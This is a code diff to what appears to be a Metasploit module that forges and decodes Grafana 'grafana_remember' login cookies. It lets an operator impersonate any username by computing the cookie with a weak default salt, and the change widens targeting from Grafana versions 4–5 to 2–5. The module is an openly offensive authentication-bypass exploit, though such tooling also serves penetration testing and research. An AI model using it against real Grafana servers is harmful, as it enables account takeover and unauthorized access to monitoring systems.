@@ -32,7 +32,7 @@ metadata = {
     ],
     'type': 'single_scanner',
     'options': {
-        'VERSION': {'type': 'string', 'description': 'Grafana version (5.x or 4.x)', 'required': True, 'default': '5'},
+        'VERSION': {'type': 'string', 'description': 'Grafana version (5,4,3,2)', 'required': True, 'default': '5'},
         'USERNAME': {'type': 'string', 'description': 'Valid username', 'required': False, 'default': ''},
         'RHOSTS': {'type': 'string', 'description': 'The target address range or CIDR identifier', 'required': False, 'default': '127.0.0.1'},
         'COOKIE': {'type': 'string', 'description': 'Cookie for decryption', 'required': False, 'default': ''}
@@ -40,7 +40,7 @@ metadata = {
 }
 
 
-def encrypt_version5(username):
+def encrypt_version_5(username):
     
     salt = b''
     iterations = 1000
@@ -53,7 +53,7 @@ def encrypt_version5(username):
     return cookie
 
 
-def encrypt_version4(username):
+def encrypt_version_4to2(username):
 
     salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
     iterations = 1000
@@ -66,7 +66,7 @@ def encrypt_version4(username):
     return cookie
 
 
-def decrypt_version5(cookie):
+def decrypt_version_5(cookie):
     
     salt = b''
     iterations = 1000
@@ -78,7 +78,7 @@ def decrypt_version5(cookie):
     return username
 
 
-def decrypt_version4(cookie):
+def decrypt_version_4to2(cookie):
 
     salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
     iterations = 1000
@@ -91,28 +91,35 @@ def decrypt_version4(cookie):
 
 
 def run(args):
+    
+    if args['USERNAME'] == '' and args['COOKIE'] == '':
+        module.log("Username or cookie should've been set to generate cookies", 'warning')
 
-    if args['USERNAME'] != '':
+    elif args['USERNAME'] != '':
         module.log("Delete the session cookie and set the following", 'info')
         if args['VERSION'] == '5':
             module.log("grafana_user: "+args['USERNAME'], 'good')
-            module.log("grafana_remember: "+encrypt_version5(args['USERNAME']), 'good')
+            module.log("grafana_remember: "+encrypt_version_5(args['USERNAME']), 'good')
             return
-        elif args['VERSION'] == '4':
+        elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
             module.log("grafana_user: "+args['USERNAME'], 'good')
-            module.log("grafana_remember: "+encrypt_version4(args['USERNAME']), 'good')
+            module.log("grafana_remember: "+encrypt_version_4to2(args['USERNAME']), 'good')
             return
+        else:
+            module.log("Available versions are either 5,4,3 or 2", 'warning')
     
     elif args['COOKIE'] != '':
         module.log("Delete the session cookie and set the following", 'info')
         if args['VERSION'] == '5':
-            module.log("grafana_user: "+decrypt_version5(args['COOKIE']), 'good')
+            module.log("grafana_user: "+decrypt_version_5(args['COOKIE']), 'good')
             module.log("grafana_remember: "+args['COOKIE'], 'good')
             return
-        elif args['VERSION'] == '4':
-            module.log("grafana_user: "+decrypt_version4(args['COOKIE']), 'good')
+        elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
+            module.log("grafana_user: "+decrypt_version_4to2(args['COOKIE']), 'good')
             module.log("grafana_remember: "+args['COOKIE'], 'good')
             return
+        else:
+            module.log("Available versions are either 5,4,3,2", 'warning')
 
 
 
